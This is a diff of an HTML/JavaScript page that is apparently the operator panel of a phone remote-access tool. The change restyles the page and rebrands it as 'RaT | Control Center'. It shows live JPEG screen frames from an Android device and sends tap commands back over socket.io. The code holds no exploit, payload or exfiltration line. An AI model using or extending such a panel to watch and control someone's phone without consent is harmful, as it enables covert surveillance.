@@ -3,45 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Remote Control Panel</title>
+    <title>RaT | Control Center</title>
     <style>
-        body { 
-            background: #121212; 
-            color: #e0e0e0; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --accent: #10b981;
+            --text: #f8fafc;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
             margin: 0;
-            padding: 20px;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
         }
-        h2 { margin-bottom: 10px; color: #00e676; }
-        .status { 
-            margin-bottom: 20px; 
-            padding: 8px 16px; 
-            border-radius: 20px; 
-            background: #333;
-            font-size: 0.9em;
+
+        /* Sidebar info */
+        .sidebar {
+            width: 300px;
+            background: var(--card);
+            border-right: 1px solid #334155;
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
         }
-        .online { color: #00e676; border: 1px solid #00e676; }
-        .offline { color: #ff5252; border: 1px solid #ff5252; }
-        
-        /* Canvas mimics phone aspect ratio */
-        canvas { 
-            border: 2px solid #444; 
-            background: #000; 
-            max-width: 95vw; 
-            max-height: 80vh; 
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--accent);
+            letter-spacing: -0.05em;
+        }
+
+        .status-badge {
+            padding: 0.5rem 1rem;
+            border-radius: 99px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: #0002;
+        }
+
+        .online { color: var(--accent); border: 1px solid var(--accent); }
+        .offline { color: #ef4444; border: 1px solid #ef4444; }
+
+        /* Main Viewport */
+        .viewport {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            position: relative;
+        }
+
+        .phone-frame {
+            background: #000;
+            border: 12px solid #334155;
+            border-radius: 40px;
+            padding: 5px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        canvas {
+            display: block;
+            max-height: 85vh;
+            width: auto;
+            border-radius: 30px;
             cursor: crosshair;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .controls-hint {
+            position: absolute;
+            bottom: 2rem;
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(8px);
+            padding: 0.75rem 1.5rem;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            border: 1px solid #334155;
         }
     </style>
 </head>
 <body>
-    <h2>Remote Controller</h2>
-    <div id="stat" class="status offline">Waiting for phone...</div>
-    
-    <canvas id="screen" width="1080" height="2400"></canvas>
+
+    <div class="sidebar">
+        <div class="logo">RaT CONTROL</div>
+        <div id="stat" class="status-badge offline">
+            <span id="dot">●</span> Waiting for Device...
+        </div>
+        <hr style="border:0; border-top: 1px solid #334155; width:100%">
+        <div>
+            <small style="color: #94a3b8">Active Sessions</small>
+            <p id="session-id">None</p>
+        </div>
+    </div>
+
+    <div class="viewport">
+        <div class="phone-frame">
+            <canvas id="screen" width="1080" height="2400"></canvas>
+        </div>
+        <div class="controls-hint">Click anywhere on the screen to simulate a tap</div>
+    </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -49,46 +121,37 @@
         const canvas = document.getElementById('screen');
         const ctx = canvas.getContext('2d');
         const statusDiv = document.getElementById('stat');
+        const sessionText = document.getElementById('session-id');
 
-        // Identify this connection as the controller
         socket.emit("identify", "controller");
 
-        // Receive the screen frame from the server
         socket.on("display_frame", (data) => {
-            statusDiv.innerText = "Device Online";
-            statusDiv.className = "status online";
-            
+            statusDiv.innerText = "● Device Online";
+            statusDiv.className = "status-badge online";
+            sessionText.innerText = socket.id;
+
             const img = new Image();
             img.onload = () => {
-                // Draw the incoming frame onto the canvas
                 ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
             };
-            // Use Base64 data received from the phone
             img.src = "data:image/jpeg;base64," + data;
         });
 
-        // Capture clicks and send to server
         canvas.addEventListener('mousedown', (e) => {
             const rect = canvas.getBoundingClientRect();
-            
-            // Calculate coordinates as percentages (0.0 to 1.0)
-            // This ensures the tap lands in the right spot regardless of screen size
+            // Calculate normalized coordinates (0.0 to 1.0)
             const x = (e.clientX - rect.left) / rect.width;
             const y = (e.clientY - rect.top) / rect.height;
             
-            console.log(`Sending tap: X=${x.toFixed(2)}, Y=${y.toFixed(2)}`);
+            socket.emit("send_command", { action: "tap", x: x, y: y });
             
-            // Emit command to the server
-            socket.emit("send_command", { 
-                action: "tap", 
-                x: x, 
-                y: y 
-            });
+            // Visual feedback for click
+            console.log(`Tap sent at ${x.toFixed(2)}, ${y.toFixed(2)}`);
         });
 
-        socket.on('disconnect', () => {
-            statusDiv.innerText = "Server Disconnected";
-            statusDiv.className = "status offline";
+        socket.on("disconnect", () => {
+            statusDiv.innerText = "● Disconnected";
+            statusDiv.className = "status-badge offline";
         });
     </script>
 </body>
